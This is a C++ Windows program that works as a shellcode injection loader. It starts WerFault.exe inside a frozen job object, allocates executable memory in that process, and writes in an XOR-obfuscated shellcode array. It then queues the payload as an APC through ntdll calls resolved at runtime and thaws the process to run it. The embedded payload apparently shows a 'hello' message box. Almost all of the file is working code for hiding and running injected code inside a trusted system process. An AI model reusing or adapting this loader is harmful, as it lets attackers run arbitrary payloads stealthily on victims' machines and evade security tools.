#define _CRT_SECURE_NO_WARNINGS

#define JobObjectFreezeInformation 18
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define XOR_KEY 0xAA

#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <winternl.h>

HANDLE hJob = NULL;

typedef const OBJECT_ATTRIBUTES* PCOBJECT_ATTRIBUTES;

typedef NTSTATUS(NTAPI* pNtQueueApcThread)(HANDLE, PVOID, PVOID, PVOID, PVOID);
typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, ULONG, PULONG);
typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemoryEx)(HANDLE, PVOID*, PSIZE_T, ULONG, ULONG, PVOID, ULONG);
typedef NTSTATUS(NTAPI* pNtSetInformationJobObject)(HANDLE, JOBOBJECTINFOCLASS, PVOID, ULONG);
typedef NTSTATUS(NTAPI* pNtAssignProcessToJobObject)(HANDLE, HANDLE);
typedef NTSTATUS(NTAPI* pNtCreateJobObject)(PHANDLE, ACCESS_MASK, PCOBJECT_ATTRIBUTES);

HMODULE hNtDll = GetModuleHandleA("ntdll.dll");

pNtQueueApcThread NtQueueApcThread = (pNtQueueApcThread)GetProcAddress(hNtDll, "NtQueueApcThread");
pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtDll, "NtWriteVirtualMemory");
pNtAllocateVirtualMemoryEx NtAllocateVirtualMemoryEx = (pNtAllocateVirtualMemoryEx)GetProcAddress(hNtDll, "NtAllocateVirtualMemoryEx");
pNtSetInformationJobObject NtSetInformationJobObject = (pNtSetInformationJobObject)GetProcAddress(hNtDll, "NtSetInformationJobObject");
pNtAssignProcessToJobObject NtAssignProcessToJobObject = (pNtAssignProcessToJobObject)GetProcAddress(hNtDll, "NtAssignProcessToJobObject");
pNtCreateJobObject NtCreateJobObject = (pNtCreateJobObject)GetProcAddress(hNtDll, "NtCreateJobObject");


// Job Object Definitions for Process Freezing
typedef struct _JOBOBJECT_WAKE_FILTER {
	ULONG HighEdgeFilter;
	ULONG LowEdgeFilter;
} JOBOBJECT_WAKE_FILTER, * PJOBOBJECT_WAKE_FILTER;

typedef struct _JOBOBJECT_FREEZE_INFORMATION {
	union {
		ULONG Flags;
		struct {
			ULONG FreezeOperation : 1;
			ULONG FilterOperation : 1;
			ULONG SwapOperation : 1;
			ULONG Reserved : 29;
		};
	};
	BOOLEAN Freeze;
	BOOLEAN Swap;
	UCHAR Reserved0[2];
	JOBOBJECT_WAKE_FILTER WakeFilter;
} JOBOBJECT_FREEZE_INFORMATION, * PJOBOBJECT_FREEZE_INFORMATION;


void SetColor(int color) {
	HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hConsole, color);
}

void decrypt(unsigned char* code, int size) {
	for (int i = 0; i < size; i++) {
		code[i] ^= XOR_KEY;
	}
}


int main() {

	NTSTATUS creationJob = NtCreateJobObject(&hJob, STANDARD_RIGHTS_ALL | 63, NULL);
	if (!NT_SUCCESS(creationJob)) {
		SetColor(FOREGROUND_RED);
		printf("Error: 0x%X\n", creationJob);
		CloseHandle(hJob);
		return -1;
	}

	JOBOBJECT_FREEZE_INFORMATION freezeInfo = { 0 };
	freezeInfo.FreezeOperation = 1; // Initiate freeze
	freezeInfo.Freeze = TRUE;

	NTSTATUS freezeStatus = NtSetInformationJobObject(hJob, (JOBOBJECTINFOCLASS)JobObjectFreezeInformation, &freezeInfo, sizeof(freezeInfo));
	if (!NT_SUCCESS(freezeStatus)) {
		SetColor(FOREGROUND_RED);
		printf("Error: 0x%X\n", freezeStatus);
		CloseHandle(hJob);
		return -1;
	}

	STARTUPINFOEXW siEx = { 0 };
	ZeroMemory(&siEx, sizeof(siEx));
	siEx.StartupInfo.cb = sizeof(siEx);

	SIZE_T attrListSize = 0;

	InitializeProcThreadAttributeList(NULL, 1, 0, &attrListSize);
	siEx.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrListSize);
	if (!siEx.lpAttributeList) {
		printf("[-] Error in the attribute list allocation.\n");
		CloseHandle(hJob);
		return -1;
	}
	if (!InitializeProcThreadAttributeList(siEx.lpAttributeList, 1, 0, &attrListSize)) {
		std::cerr << "[-] Error initialising the attribute list. Error: " << GetLastError() << std::endl;
		HeapFree(GetProcessHeap(), 0, siEx.lpAttributeList);
		CloseHandle(hJob);
		return -1;
	}
	
	if (!UpdateProcThreadAttribute(
		siEx.lpAttributeList,
		0,
		PROC_THREAD_ATTRIBUTE_JOB_LIST,
		&hJob,
		sizeof(HANDLE),
		NULL,
		NULL))
	{
		std::cerr << "[-] Error updating the attribute list. Error: " << GetLastError() << std::endl;
		DeleteProcThreadAttributeList(siEx.lpAttributeList);
		HeapFree(GetProcessHeap(), 0, siEx.lpAttributeList);
		CloseHandle(hJob);
		return -1;
	}


	PROCESS_INFORMATION pi = { 0 };
	ZeroMemory(&pi, sizeof(pi));

	if (!CreateProcessW(
		L"C:\\Windows\\System32\\WerFault.exe",
		NULL,
		NULL,
		NULL,
		FALSE,
		EXTENDED_STARTUPINFO_PRESENT,
		NULL,
		NULL,
		&siEx.StartupInfo,
		&pi))
	{
		std::cerr << "[-] CreateProcessW failed: " << GetLastError() << std::endl;
		DeleteProcThreadAttributeList(siEx.lpAttributeList);
		HeapFree(GetProcessHeap(), 0, siEx.lpAttributeList);
		CloseHandle(hJob);
		return -1;
	}
	std::cout << "[+] Process started in Job! PID: " << pi.dwProcessId << std::endl;


	DeleteProcThreadAttributeList(siEx.lpAttributeList);
	HeapFree(GetProcessHeap(), 0, siEx.lpAttributeList);


	unsigned char myCode[] = { 0x3a, 0x3a, 0x3a, 0x56, 0xe2, 0x2b, 0x4e, 0x5a, 0x55, 0x55, 0x55, 0x42, 0x7a, 0xaa, 0xaa, 0xaa, 0xeb, 0xfb, 0xeb, 0xfa, 0xf8, 0xfb, 0xfc, 0xe2, 0x9b, 0x78, 0xcf, 0xe2, 0x21, 0xf8, 0xca, 0x94, 0xe2, 0x21, 0xf8, 0xb2, 0x94, 0xe2, 0x21, 0xf8, 0x8a, 0x94, 0xe2, 0x21, 0xd8, 0xfa, 0x94, 0xe2, 0xa5, 0x1d, 0xe0, 0xe0, 0xe7, 0x9b, 0x63, 0xe2, 0x9b, 0x6a, 0x06, 0x96, 0xcb, 0xd6, 0xa8, 0x86, 0x8a, 0xeb, 0x6b, 0x63, 0xa7, 0xeb, 0xab, 0x6b, 0x48, 0x47, 0xf8, 0xeb, 0xfb, 0x94, 0xe2, 0x21, 0xf8, 0x8a, 0x94, 0x21, 0xe8, 0x96, 0xe2, 0xab, 0x7a, 0x94, 0x21, 0x2a, 0x22, 0xaa, 0xaa, 0xaa, 0xe2, 0x2f, 0x6a, 0xde, 0xc5, 0xe2, 0xab, 0x7a, 0xfa, 0x94, 0x21, 0xe2, 0xb2, 0x94, 0xee, 0x21, 0xea, 0x8a, 0xe3, 0xab, 0x7a, 0x49, 0xf6, 0xe2, 0x55, 0x63, 0x94, 0xeb, 0x21, 0x9e, 0x22, 0xe2, 0xab, 0x7c, 0xe7, 0x9b, 0x63, 0xe2, 0x9b, 0x6a, 0x06, 0xeb, 0x6b, 0x63, 0xa7, 0xeb, 0xab, 0x6b, 0x92, 0x4a, 0xdf, 0x5b, 0x94, 0xe6, 0xa9, 0xe6, 0x8e, 0xa2, 0xef, 0x93, 0x7b, 0xdf, 0x7c, 0xf2, 0x94, 0xee, 0x21, 0xea, 0x8e, 0xe3, 0xab, 0x7a, 0xcc, 0x94, 0xeb, 0x21, 0xa6, 0xe2, 0x94, 0xee, 0x21, 0xea, 0xb6, 0xe3, 0xab, 0x7a, 0x94, 0xeb, 0x21, 0xae, 0x22, 0xe2, 0xab, 0x7a, 0xeb, 0xf2, 0xeb, 0xf2, 0xf4, 0xf3, 0xf0, 0xeb, 0xf2, 0xeb, 0xf3, 0xeb, 0xf0, 0xe2, 0x29, 0x46, 0x8a, 0xeb, 0xf8, 0x55, 0x4a, 0xf2, 0xeb, 0xf3, 0xf0, 0x94, 0xe2, 0x21, 0xb8, 0x43, 0xe3, 0x55, 0x55, 0x55, 0xf7, 0x94, 0xe2, 0x27, 0x27, 0xb0, 0xab, 0xaa, 0xaa, 0xeb, 0x10, 0xe6, 0xdd, 0x8c, 0xad, 0x55, 0x7f, 0xe3, 0x6d, 0x6b, 0xaa, 0xaa, 0xaa, 0xaa, 0x94, 0xe2, 0x27, 0x3f, 0xa4, 0xab, 0xaa, 0xaa, 0x94, 0xe6, 0x27, 0x2f, 0xbe, 0xab, 0xaa, 0xaa, 0xe2, 0x9b, 0x63, 0xeb, 0x10, 0xef, 0x29, 0xfc, 0xad, 0x55, 0x7f, 0xe2, 0x9b, 0x63, 0xeb, 0x10, 0x5a, 0x1f, 0x08, 0xfc, 0x55, 0x7f, 0xc2, 0xcf, 0xc6, 0xc6, 0xc5, 0xaa, 0xc2, 0xcf, 0xc6, 0xc6, 0xc5, 0xaa, 0xdf, 0xd9, 0xcf, 0xd8, 0x99, 0x98, 0x84, 0xce, 0xc6, 0xc6, 0xaa };


	SIZE_T sizeOfCode = sizeof(myCode);
	SIZE_T regionSize = sizeOfCode;

	PVOID remoteMemory = NULL;

	
	NTSTATUS allocStatus = NtAllocateVirtualMemoryEx(pi.hProcess, &remoteMemory, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, NULL, 0);
	if (NT_SUCCESS(allocStatus)) {

		printf("[+] NtAllocateVirtualMemoryEx allocated memory at 0x%p\n", remoteMemory);
	}
	else {

		printf("Error: 0x%X\n", allocStatus);
		CloseHandle(hJob);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
		return -1;
	}

	decrypt(myCode, sizeOfCode);

	NTSTATUS writeStatus = NtWriteVirtualMemory(pi.hProcess, remoteMemory, myCode, sizeOfCode, NULL);
	if (NT_SUCCESS(writeStatus)) {
		printf("[+] Shellcode was written to 0x%p\n", remoteMemory);
	}
	else {
		printf("Error: 0x%X\n", writeStatus);
		CloseHandle(hJob);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
		return 1;
	}

	PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)remoteMemory;
	NTSTATUS statusAPC = NtQueueApcThread(pi.hThread, (PVOID)apcRoutine, NULL, NULL, NULL);

	if (!NT_SUCCESS(statusAPC)) {
		SetColor(FOREGROUND_RED);
		printf("\t[!] NtQueueApcThread Failed With Error : 0x%X \n", statusAPC);
		return FALSE;
	}
	else {
		SetColor(FOREGROUND_GREEN);
		printf("[+] NtQueueApcThread successfully queued APC\n");
	}

	SetColor(FOREGROUND_INTENSITY);
	printf("[i] Press Enter for thawing....\n");
	getchar();

	freezeInfo.FreezeOperation = 1; // Unfreeze operation
	freezeInfo.Freeze = FALSE;


	NTSTATUS unfreezeStatus = NtSetInformationJobObject(hJob, (JOBOBJECTINFOCLASS)JobObjectFreezeInformation, &freezeInfo, sizeof(freezeInfo));
	if (!NT_SUCCESS(unfreezeStatus)) {
		SetColor(FOREGROUND_RED);
		printf("Error: 0x%X\n", unfreezeStatus);
		CloseHandle(hJob);
		return -1;
	}

	SetColor(FOREGROUND_BLUE);
	printf("[!] Process thawed successfully!\n");

	WaitForSingleObject(pi.hProcess, 0xFFFFFFFF);

	CloseHandle(hJob);
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	return 0;
}
